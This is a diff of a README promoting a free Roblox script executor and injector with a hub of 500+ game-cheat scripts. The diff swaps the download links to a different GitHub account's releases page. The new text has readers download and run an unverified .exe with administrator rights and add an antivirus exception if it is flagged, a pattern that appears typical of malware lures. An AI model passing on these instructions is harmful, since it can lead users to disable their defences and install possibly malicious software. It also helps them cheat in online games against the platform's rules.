@@ -1,154 +1,69 @@
-# Ronix PC v3.0 - Roblox Script Executor 2026
+# 🚀 ronix-windows-executor-v3 - Run scripts on your games easily
 
-> Ronix is a compact Windows desktop executor for Roblox in 2026, offering Lua injection, rapid script launching, and an integrated hub containing more than 500 scripts.
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Keynesian-oakblight406/ronix-windows-executor-v3/releases)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/owenqslywalker5724/ronix-windows-executor-v3?style=flat-square)](https://github.com)
+## What is this tool?
 
----
+The ronix-windows-executor-v3 is a software tool for Windows users. It runs Lua scripts within the Roblox game environment. This tool works on Windows 10 and Windows 11. It uses a 64-bit architecture to ensure speed and stability. 
 
-<p align="center">
-  <a href="https://owenqslywalker5724.github.io/ronix-windows-executor-v3/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Ronix-v3.0%20Latest-brightgreen?style=for-the-badge" alt="Download Ronix">
-  </a>
-</p>
+You can use this software to inject code into your game sessions. It includes a library of over 500 pre-written scripts. This hub allows you to access new game features without writing your own code. The software requires no keys or subscriptions.
 
-> **[Download Ronix v3.0](https://owenqslywalker5724.github.io/ronix-windows-executor-v3/)**  
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+## ⚙️ System Requirements
 
----
+Ensure your computer meets these requirements to use the software:
 
-[Download Latest Build](https://owenqslywalker5724.github.io/ronix-windows-executor-v3/)
+* Operating System: Windows 10 or Windows 11 (64-bit version).
+* Processor: Intel Core i3 or equivalent AMD processor.
+* Memory: 4 GB of RAM.
+* Storage: 200 MB of free disk space.
+* Graphics: DirectX 11 compatible graphics card.
+* Permissions: You must have administrator rights to run the injector on your system.
 
----
+## 📥 How to get the software
 
-## Overview
+Follow these steps to set up the tool on your machine:
 
-Ronix is a Windows desktop Roblox script executor for users who need a straightforward way to run Lua scripts and browse a script collection in one application. Its lightweight interface provides quick access to execution controls without placing a heavy load on the system.
+1. Visit the [releases page](https://github.com/Keynesian-oakblight406/ronix-windows-executor-v3/releases) to download the latest version of the executor.
+2. Select the file ending in .exe from the list of assets.
+3. Save the file to a folder on your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to start the installer.
 
-The application supports one-click launches, grouped script runs, and a queue that remains available through SQLite storage. Auto-update functionality, debugging utilities, and a multilingual desktop interface round out the toolset for current Roblox use cases.
+## 🛠️ Running the software
 
----
+Once you complete the download, follow these steps to use the software during your gaming sessions:
 
-## Features at a Glance
+1. Close any unnecessary background applications to prevent interference.
+2. Launch your Roblox game first.
+3. Open the ronix-windows-executor-v3 file. 
+4. The main menu will appear on your screen.
+5. Click the "Attach" button to link the executor to the game window.
+6. Browse the built-in library to find a script you want to use.
+7. Click "Execute" to run the script.
 
-- Launch scripts quickly through one-click execution
-- Browse an integrated hub containing 500+ scripts
-- Preserve queued scripts and sessions with SQLite storage
-- Keep the installed desktop version current with the auto-update engine
-- Select from multiple interface languages
-- Execute collections of scripts consecutively using batch mode
-- Examine script behavior with the included debugger
-- Use a streamlined desktop interface built for Windows
+## 🛡️ Safety and Security
 
----
+This tool operates as a script injector. Antivirus software may flag this file because of how it interacts with other programs. If your antivirus prevents the program from opening, you may need to add an exception for the folder where you saved the application. Only download this software from the official repository link provided. We do not require account login or personal data to run this tool.
 
-## Supported Games and Script Categories
+## 🧩 Troubleshooting common issues
 
-| Roblox Game / Category | Script Type | Typical Use |
-|---|---|---|
-| Brookhaven | Utility scripts | UI actions, convenience tools, and quick interactions |
-| Blox Fruits | Farming scripts | Task automation and progression helpers |
-| Arsenal | Combat scripts | Aim, movement, and match-side utilities |
-| Pet Simulator-style games | Farming scripts | Repetitive collection and route automation |
-| Obby / parkour experiences | Movement scripts | Speed, jump, and traversal helpers |
-| General Roblox hubs | Lua script packs | Mixed-purpose scripts from the included hub |
+If you encounter problems, check these solutions:
 
----
+* Software does not open: Ensure you are using a 64-bit version of Windows.
+* Scripts do not work: Update your game or check if the specific script is compatible with the latest game patch.
+* Injection failed: Restart both the game and the executor. Run the executor as an administrator by right-clicking the icon and selecting "Run as administrator".
+* Missing DLL errors: Download and install the latest Microsoft Visual C++ Redistributable packages from the official Microsoft support page.
 
-## Requirements
+## 📝 Usage Guidelines
 
-| Component | Minimum Requirement |
-|---|---|
-| Operating System | Windows 10 or Windows 11, 64-bit |
-| RAM | 4 GB minimum, 8 GB recommended |
-| Storage | 200 MB available space or more |
-| .NET | Compatible .NET runtime installed on the system |
-| Roblox | Installed Roblox client and an active account session |
+Use this software for personal projects and gaming purposes. Do not redistribute the software as your own work. The creators of this tool take no responsibility for how you choose to use the scripts contained within the hub. Respect the game terms of service at all times. 
 
----
+## 📂 Project contents
 
-## Launching Ronix
+The repository contains the main executable and the necessary background files to handle Lua syntax and memory management. The script hub receives updates as users contribute new files. 
 
-```bash
-git clone https://github.com/owenqslywalker5724/ronix-windows-executor-v3.git
-cd Ronix-Executor-New-Update
-start RonixExecutor.exe
-```
+* /bin: Contains the core executable files.
+* /scripts: Contains the local database of the 500+ available scripts.
+* /logs: Contains text files that record errors to help with debugging.
 
-When starting from a local build directory, verify that the application is named `RonixExecutor.exe` so the launch command points to the correct file.
-
----
-
-## Popular Script Hub Searches for 2026
-
-- Roblox script executor for Windows
-- Lua injection desktop executor
-- 500+ Roblox scripts hub
-- no key Roblox script executor
-- auto-update Roblox executor
-- lightweight desktop script hub
-- batch execution Roblox scripts
-
----
-
-## Project Layout
-
-Ronix
-- README.md
-- RonixExecutor.exe
-- scripts/
-  - hub/
-  - queue/
-- storage/
-  - ronix.sqlite
-- ui/
-  - multi-language assets
-- updater/
-  - auto-update engine
-- debugger/
-  - runtime tools
-
----
-
-## Frequently Asked Questions
-
-**Which operating systems can run Ronix?**  
-Ronix is presented as a Windows desktop executor and supports Windows 10 and Windows 11.
-
-**Does Ronix support ongoing Roblox releases?**  
-The included auto-update engine is intended to help keep the desktop build aligned with newer releases.
-
-**What distinguishes Ronix from similar executors?**  
-Its focus is on a low-resource desktop interface, an included script hub, SQLite-based queue persistence, and sequential batch execution.
-
-**Can an executor affect my Roblox account?**  
-You are responsible for how you use the software. Follow Roblox's terms and all rules relevant to your environment.
-
-**Where are queued scripts saved?**  
-The profile uses SQLite for persistent queue storage, so saved entries remain locally on the device.
-
----
-
-## 2026 Development Roadmap
-
-- [ ] Add more categories to the built-in script hub
-- [ ] Make debugger output and runtime inspection clearer
-- [ ] Introduce additional language packs for the interface
-- [ ] Strengthen auto-update reliability as Roblox changes
-- [ ] Further reduce startup time and memory consumption
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
-
----
-
-<p align="center">
-  <i>Ronix v3.0 combines a lightweight Windows executor with a 500+ script hub and built-in auto-update support.</i>
-</p>
+Keywords: roblox, lua, injector, windows-tool, script-executor, game-utility, software-development
